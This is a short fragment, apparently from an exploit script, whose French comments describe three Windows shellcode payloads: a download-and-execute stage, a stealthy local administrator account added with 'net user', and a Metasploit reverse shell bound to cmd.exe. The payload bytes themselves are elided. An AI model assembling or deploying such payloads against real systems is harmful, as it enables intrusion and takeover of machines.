...
# telecharge et execute un fichier (urldownloadtofile / winexec)
PAYLOAD_EASY = (
...
# ajout furtif d'un compte administrateur local (cmd.exe /c net user..)
PAYLOAD_MEDIUM = (
...
# reverse shell tcp (metasploit) bindant les sockets sur cmd.exe
PAYLOAD_HARD = (
